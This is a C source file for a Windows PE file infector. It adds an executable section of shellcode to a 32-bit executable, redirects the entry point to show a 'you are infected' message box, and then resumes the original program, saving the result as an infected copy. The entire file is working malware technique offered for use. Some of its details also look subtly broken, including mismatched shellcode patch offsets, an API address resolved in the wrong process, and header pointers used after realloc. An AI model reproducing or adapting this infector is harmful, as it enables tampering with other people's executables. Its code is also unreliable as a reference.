#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Shellcode template: pushad; push offsets; call MessageBoxA; popad; jmp to old OEP
unsigned char shellcode_template[] = {
    0x60,                                   // pushad
    // push offset caption (filled at runtime)
    0x68, 0,0,0,0,                          // push offset "Alert"
    // push offset text (filled at runtime)
    0x68, 0,0,0,0,                          // push offset "you are infected"
    0x6A, 0x00,                             // push MB_OK
    0x6A, 0x00,                             // push MB_ICONWARNING (OR with previous)
    0x6A, 0x00,                             // push hWnd = NULL
    0xE8, 0,0,0,0,                          // call MessageBoxA (relative)
    0x61,                                   // popad
    // jmp back to original entry point (filled at runtime)
    0xE9, 0,0,0,0                           // jmp old_entry - (next_instruction)
};

int main(int argc, char** argv) {
    printf("[DEBUG] entered main(); argc=%d\n", argc);
    if (argc != 2) {
        fprintf(stderr, "Usage: injector.exe <target_pe_32bit.exe>\n");
        return 1;
    }
    const char* targetPath = argv[1];

    // 1. Read the target PE into memory
    FILE* f = fopen(targetPath, "rb");
    if (!f) { fprintf(stderr, "Cannot open target file\n"); return 1; }
    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);
    BYTE* buffer = (BYTE*)malloc(fileSize);
    if (!buffer) { fprintf(stderr, "Memory allocation failed\n"); fclose(f); return 1; }
    fread(buffer, 1, fileSize, f);
    fclose(f);

    // 2. Parse DOS & NT headers
    IMAGE_DOS_HEADER* dos    = (IMAGE_DOS_HEADER*)buffer;
    IMAGE_NT_HEADERS* nt     = (IMAGE_NT_HEADERS*)(buffer + dos->e_lfanew);
    IMAGE_FILE_HEADER* fh    = &nt->FileHeader;
    IMAGE_OPTIONAL_HEADER* oh = &nt->OptionalHeader;

    if (oh->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        fprintf(stderr, "Not a 32-bit PE file\n");
        free(buffer);
        return 1;
    }

    // 3. Save old entry point and image base
    DWORD oldOEP   = oh->AddressOfEntryPoint;
    DWORD imageBase = oh->ImageBase;

    // 4. Locate last section and compute new section parameters
    WORD numSec = fh->NumberOfSections;
    IMAGE_SECTION_HEADER* secs = (IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader + fh->SizeOfOptionalHeader);
    IMAGE_SECTION_HEADER* last = &secs[numSec - 1];

    DWORD fileAlign = oh->FileAlignment;
    DWORD secAlign  = oh->SectionAlignment;

    DWORD newVA  = ((last->VirtualAddress + last->Misc.VirtualSize + secAlign - 1) / secAlign) * secAlign;
    DWORD newRaw = ((last->PointerToRawData  + last->SizeOfRawData  + fileAlign - 1) / fileAlign) * fileAlign;
    DWORD shellSize = sizeof(shellcode_template);

    // 5. Prepare new section header
    IMAGE_SECTION_HEADER ns = {0};
    memcpy(ns.Name, ".injc", 5);
    ns.VirtualAddress  = newVA;
    ns.Misc.VirtualSize = shellSize;
    ns.PointerToRawData = newRaw;
    ns.SizeOfRawData    = ((shellSize + fileAlign - 1) / fileAlign) * fileAlign;
    ns.Characteristics  = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    // Expand buffer for new section
    buffer = (BYTE*)realloc(buffer, newRaw + ns.SizeOfRawData);

    // Insert new section header
    secs[numSec] = ns;
    fh->NumberOfSections++;
    oh->SizeOfImage = newVA + ns.SizeOfRawData;

    // 6. Copy and patch shellcode + strings
    BYTE* shellPtr = buffer + newRaw;
    const char* text    = "you are infected";
    const char* caption = "Alert";
    DWORD offsText    = shellSize;
    DWORD offsCaption = offsText + (DWORD)strlen(text) + 1;

    memcpy(shellPtr + offsText, text, strlen(text) + 1);
    memcpy(shellPtr + offsCaption, caption, strlen(caption) + 1);
    memcpy(shellPtr, shellcode_template, shellSize);

    #define PATCH4(off, val) (*(DWORD*)(shellPtr + (off)) = (DWORD)(val))
    // patch caption/text offsets
    PATCH4(2, newVA + offsCaption);
    PATCH4(7, newVA + offsText);
    // patch call to MessageBoxA
    DWORD callSite = newVA + 12;
    DWORD msgAddr  = (DWORD)GetProcAddress(GetModuleHandleA("user32.dll"), "MessageBoxA");
    DWORD delta    = msgAddr - (imageBase + callSite) - 5;
    PATCH4(12, delta);
    // patch jump back to old OEP
    DWORD jmpSite = newVA + shellSize - 5;
    DWORD relJmp  = (imageBase + oldOEP) - (imageBase + jmpSite) - 5;
    PATCH4(shellSize - 4, relJmp);
    #undef PATCH4

    // 7. Redirect entry point
    oh->AddressOfEntryPoint = newVA;

    // 8. Write out infected file
    char outPath[MAX_PATH];
    snprintf(outPath, MAX_PATH, "%s.infected.exe", targetPath);
    FILE* out = fopen(outPath, "wb");
    if (!out) { fprintf(stderr, "Cannot create output file\n"); free(buffer); return 1; }
    fwrite(buffer, 1, newRaw + ns.SizeOfRawData, out);
    fclose(out);
    free(buffer);

    printf("Injected! Saved as: %s\n", outPath);
    return 0;
}
